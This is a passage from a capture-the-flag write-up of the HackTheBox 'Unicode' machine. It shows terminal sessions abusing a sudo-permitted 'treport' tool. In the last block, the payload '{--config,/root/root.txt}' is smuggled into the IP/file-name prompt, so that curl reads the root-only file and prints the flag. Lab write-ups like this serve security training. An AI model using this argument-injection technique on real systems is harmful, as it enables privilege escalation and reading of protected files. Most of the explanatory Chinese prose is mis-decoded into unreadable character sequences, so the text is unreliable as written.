Matching Defaults entries for code on code:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User code may run the following commands on code:
    (root) NOPASSWD: /usr/bin/treport
```

ËÆ©Êàë‰ª¨ÁúãÁúã treport ÊòØÂÅö‰ªÄ‰πàÁöÑ:

```
code@code:~$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:1
Enter the filename:test
Enter the report:test
Enter your choice:2
ALL THE THREAT REPORTS:
threat_report_16_40_45
threat_report_16_41_22
threat_report_16_54_00
threat_report_16_25_52
threat_report_16_21_31

Enter the filename:threat_report_16_40_45
<!doctype html>
<html lang="en" class="h-100">
  <head>
```

ÊâÄ‰ª•ÊàëÂèØ‰ª•ÂàõÂª∫Âπ∂ÈòÖËØªÊä•ÂëäÔºå‰ΩÜÊòØÊàëÊâæ‰∏çÂà∞Âà©Áî®ÂÆÉÁöÑÊñπÊ≥ï„ÄÇÁ¨¨‰∏â‰∏™ÈÄâÈ°πË¶ÅÊ±ÇËæìÂÖ• IP ÂíåÊñá‰ª∂Âêç:

```
code@code:~$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:10.10.11.126/test
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  9294  100  9294    0     0  3025k      0 --:--:-- --:--:-- --:--:-- 3025k
Enter your choice:10.10.11.126/test
Wrong Input
```

Êàë‰ªéËæìÂá∫‰∏≠ÁúãÂà∞ curl Ë¢´Áî®Êù•‰∏ãËΩΩÊñá‰ª∂„ÄÇ

# ÊùÉÈôêÊèêÂçá

ËøôËä±‰∫Ü‰∏ÄÊÆµÊó∂Èó¥Ôºå‰ΩÜÊúÄÁªàÊàëÂèëÁé∞Êàë‰ª¨ÂèØ‰ª•Áî®Ëä±Êã¨Âè∑‰º†ÈÄí‰∏Ä‰∏™ÂèÇÊï∞Áªô curl„ÄÇÊàë‰ª¨ÂèØ‰ª•‰ΩøÁî® config ÂºÄÂÖ≥‰ªéÊâãÂÜå‰∏≠ËØªÂÖ•‰∏Ä‰∏™Êñá‰ª∂:

```
-K, --config <file>
    Specify a text file to read curl  arguments  from.  The  command
    line  arguments  found  in the text file will be used as if they
    were provided on the command line.

Example:
    curl --config file.txt https://example.com
```

# Ê†πÊ†áÂøó

ËøôÂÖÅËÆ∏Êàë‰ª¨ÁªïËøáÂØπ URL/IP ÁöÑÊ£ÄÊü•ÔºåËÄåÊòØËØªÂèñÊåáÂÆöÁöÑÊñá‰ª∂:

```
code@code:~$ sudo /usr/bin/treport
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:{--config,/root/root.txt}
Warning: /root/root.txt:1: warning: '5423cd0f9bd8573d133fee91e5550b66' is 
Warning: unknown
curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
```

ÈÇ£ÊòØ‰∏Ä‰∏™Áõ∏ÂΩìÊ£òÊâãÁöÑÁõíÂ≠ê„ÄÇÊàëÂ∏åÊúõ‰Ω†ÂñúÊ¨¢Ëøô‰∏™ÊºîÁªÉ„ÄÇ

‰∏ãÊ¨°ËßÅ„ÄÇ

Â¶ÇÊûú‰Ω†ÂñúÊ¨¢ËøôÁØáÊñáÁ´†ÔºåËØ∑ÁªôÊàë‰∏Ä‰∏§‰∏™ÊéåÂ£∞(ËøôÊòØÂÖçË¥πÁöÑÔºÅ)

Êé®Áâπ‚Äî[https://twitter.com/pencer_io](https://twitter.com/pencer_io)
ÁΩëÁ´ô‚Äî [https://pencer.io](https://pencer.io/)

*ÂéüËΩΩ‰∫é 2022 Âπ¥ 5 Êúà 13 Êó•*[*https://pencer . io*](https://pencer.io/ctf/ctf-htb-unicode/)*„ÄÇ*